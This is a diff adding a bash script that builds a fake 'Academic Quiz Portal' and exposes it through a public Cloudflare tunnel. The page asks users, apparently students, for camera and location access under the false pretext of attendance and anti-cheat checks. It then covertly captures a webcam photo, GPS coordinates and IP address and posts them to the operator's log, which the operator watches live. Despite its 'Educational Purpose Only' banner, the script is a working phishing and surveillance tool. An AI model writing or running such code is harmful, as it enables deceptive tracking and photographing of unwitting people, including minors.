@@ -1,0 +1,141 @@
+#!/bin/bash
+# --- BEAST-TRACK v24.0 (FULL QUIZ + SENSORS + COMPLETION CODE) ---
+NC='\033[0m'; Bold='\033[1m'
+PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
+BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'
+
+PORT=8888
+SERVER_DIR="server"
+
+mkdir -p $SERVER_DIR
+rm -f $SERVER_DIR/*.png > /dev/null 2>&1
+echo "--- SESSION RESTARTED: $(date) ---" > $SERVER_DIR/combined.log
+chmod -R 755 $SERVER_DIR
+
+clear
+echo -e "${PBlue}${Bold} ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
+echo -e " ${PYellow}⭐ ⭐ ⭐ ACADEMIC QUIZ PORTAL v24.0 ⭐ ⭐ ⭐${NC}"
+echo -e " ${BGreen}Status : ${PWhite}Educational Purpose Only${NC}"
+echo -e "${PWhite} ==========================================${NC}"
+
+# --- QUIZ SELECTION ---
+echo -e "\n ${BCyan}${Bold}[ SELECT SUBJECT ]${NC}"
+echo -e " 1. MATH  2. SCIENCE  3. ENGLISH  4. HISTORY"
+read -p $'\n [*] Select ➤ ' q_opt
+
+case $q_opt in
+1) SUBJECT="MATH"; S_CODE="MTH"; S_COLOR="#3498db"
+   Q_ARRAY='["12+15?","9x8?","50/2?","Square root of 81?","15x3?","100-45?","6x7?","25+75?","81/9?","10x10?"]'
+   A_ARRAY='["27","72","25","9","45","55","42","100","9","100"]' ;;
+2) SUBJECT="SCIENCE"; S_CODE="SCI"; S_COLOR="#2ecc71"
+   Q_ARRAY='["H2O is?","Red Planet?","Powerhouse of cell?","Closest star?","Liquid metal?","Gas we breathe?","Boiling point of water?","Hardest mineral?","Center of atom?","Study of plants?"]'
+   A_ARRAY='["Water","Mars","Mitochondria","Sun","Mercury","Oxygen","100C","Diamond","Nucleus","Botany"]' ;;
+3) SUBJECT="ENGLISH"; S_CODE="ENG"; S_COLOR="#9b59b6"
+   Q_ARRAY='["Naming word?","Action word?","Opposite of Hot?","A, E, I, O, U are?","Plural of Child?","Past tense of Eat?","A short story?","Used to join words?","Describes a noun?","Greeting word?"]'
+   A_ARRAY='["Noun","Verb","Cold","Vowels","Children","Ate","Fable","Conjunction","Adjective","Hello"]' ;;
+*) SUBJECT="HISTORY"; S_CODE="HIS"; S_COLOR="#f1c40f"
+   Q_ARRAY='["National Hero?","Year of Independence?","First President?","Oldest City?","GOMBURZA count?","Discovered PH?","Capital of PH?","PH National Flower?","Sun rays in flag?","Hero of Mactan?"]'
+   A_ARRAY='["Rizal","1898","Aguinaldo","Cebu","3","Magellan","Manila","Sampaguita","8","Lapu-Lapu"]' ;;
+esac
+
+# --- PHP Backend ---
+cat <<EOF > $SERVER_DIR/index.php
+<?php
+if (isset(\$_POST['lat'])) {
+    file_put_contents('combined.log', "LOC: ".\$_POST['lat'].",".\$_POST['lon']." | IP: ".\$_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
+    exit();
+}
+if (isset(\$_POST['img'])) {
+    \$data = base64_decode(str_replace(' ', '+', str_replace('data:image/png;base64,', '', \$_POST['img'])));
+    file_put_contents('cam_'.date('His').'.png', \$data);
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>$SUBJECT Quiz</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
+        .box { background: #2c3e50; padding: 20px; border-radius: 15px; max-width: 400px; margin: auto; border-top: 5px solid $S_COLOR; }
+        .btn { background: $S_COLOR; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin: 10px 0; font-weight: bold; }
+        #quiz-part { display: none; }
+        .code-box { background: #ecf0f1; color: #2c3e50; padding: 15px; font-family: monospace; font-weight: bold; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div id="perm-part" class="box">
+        <h2>System Permission</h2>
+        <p>To start the <b>$SUBJECT Quiz</b>, please allow Camera and Location permissions for attendance and anti-cheat verification.</p>
+        <button class="btn" onclick="startSystem()">ALLOW & START QUIZ</button>
+    </div>
+
+    <div id="quiz-part" class="box">
+        <h2 id="q-title">$SUBJECT Quiz</h2>
+        <p id="q-text"></p>
+        <input type="text" id="q-input" class="btn" style="background:white; color:black;" placeholder="Type your answer here...">
+        <button class="btn" onclick="nextQuestion()">SUBMIT ANSWER</button>
+        <p>Question <span id="q-num">1</span> of 10</p>
+    </div>
+
+    <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
+
+    <script>
+    let currentQ = 0;
+    const questions = $Q_ARRAY;
+    const answers = $A_ARRAY;
+
+    function startSystem() {
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:\`lat=\${p.coords.latitude}&lon=\${p.coords.longitude}\`});
+        });
+        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+            const v = document.getElementById('v'); v.srcObject = s;
+            setTimeout(() => {
+                const c = document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                fetch('index.php', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'img='+encodeURIComponent(c.toDataURL('image/png'))});
+            }, 2000);
+        });
+        document.getElementById('perm-part').style.display = 'none';
+        document.getElementById('quiz-part').style.display = 'block';
+        showQuestion();
+    }
+
+    function showQuestion() {
+        document.getElementById('q-text').innerText = questions[currentQ];
+        document.getElementById('q-num').innerText = currentQ + 1;
+        document.getElementById('q-input').value = '';
+    }
+
+    function nextQuestion() {
+        if (currentQ < 9) {
+            currentQ++; showQuestion();
+        } else {
+            const code = "$S_CODE-" + Math.floor(Math.random()*9000+1000) + "-DONE";
+            document.getElementById('quiz-part').innerHTML = "<h2>QUIZ FINISHED!</h2><p>Copy this code and send to your teacher:</p><div class='code-box'>" + code + "</div><p>Thank you!</p>";
+        }
+    }
+    </script>
+</body>
+</html>
+EOF
+
+# --- SERVER START ---
+echo -e "${BGreen}[*] Server Port: $PORT...${NC}"
+fuser -k $PORT/tcp > /dev/null 2>&1
+php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
+PHP_PID=$!
+cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
+CF_PID=$!
+while true; do
+    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
+    if [ ! -z "$CF_LINK" ]; then
+        echo -e "\n${BGreen}[+] LINK: ${PWhite}${Bold}$CF_LINK${NC}"
+        break
+    fi
+    sleep 2
+done
+trap "kill $PHP_PID $CF_PID; exit" INT TERM EXIT
+tail -f $SERVER_DIR/combined.log
